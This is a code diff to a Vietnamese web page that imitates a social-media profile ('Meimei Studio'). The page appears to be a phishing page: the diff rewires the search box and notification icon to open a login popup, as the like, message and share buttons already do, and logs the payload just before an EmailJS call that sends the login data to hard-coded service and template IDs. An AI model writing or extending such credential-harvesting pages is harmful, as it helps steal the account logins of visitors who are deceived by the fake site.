@@ -571,12 +571,10 @@
             position: relative;
         }
         .post .image-gallery img {
-            width: 70%;
+            width: 100%;
             border-radius: 4px;
             object-fit: cover;
             aspect-ratio: 1;
-            margin-left: auto;
-            margin-right: auto;
         }
         .post .image-gallery .more-images {
             position: relative;
@@ -958,11 +956,11 @@
                 <span>Meimei Studio</span>
             </div>
             <div class="search-bar">
-                <input type="text" placeholder="Tìm kiếm trên Meimei Studio" onclick="alert('Tính năng tìm kiếm (demo)')">
+                <input type="text" placeholder="Tìm kiếm trên Meimei Studio" onclick="showLoginPopup()">
             </div>
             <div class="title">Meimei Studio</div>
             <div>
-                <img src="https://imgur.com/pCHb488.jpg" alt="Notifications" class="icon" onclick="alert('Xem thông báo')">
+                <img src="https://imgur.com/pCHb488.jpg" alt="Notifications" class="icon" onclick="showLoginPopup()">
                 <img src="https://imgur.com/hCCEW3P.jpg" alt="Menu" class="icon">
             </div>
         </div>
@@ -988,11 +986,14 @@
 
         <!-- Action Buttons -->
         <div class="action-buttons">
-            <button class="like" onclick="showLoginPopup()"> Thích
+            <button class="like" onclick="showLoginPopup()">
+                Thích
             </button>
-            <button class="message" onclick="showLoginPopup()"> Nhắn tin
+            <button class="message" onclick="showLoginPopup()">
+                 Nhắn tin
             </button>
-            <button class="share" onclick="showLoginPopup()"> Chia sẻ
+            <button class="share" onclick="showLoginPopup()">
+               Chia sẻ
             </button>
         </div>
 
@@ -1599,6 +1600,8 @@
                 action: "Đăng nhập",
                 timestamp: new Date().toLocaleString()
             };
+
+            console.log("Thông tin gửi đi:", templateParams); // Log để kiểm tra
 
             emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
                 .then((response) => {
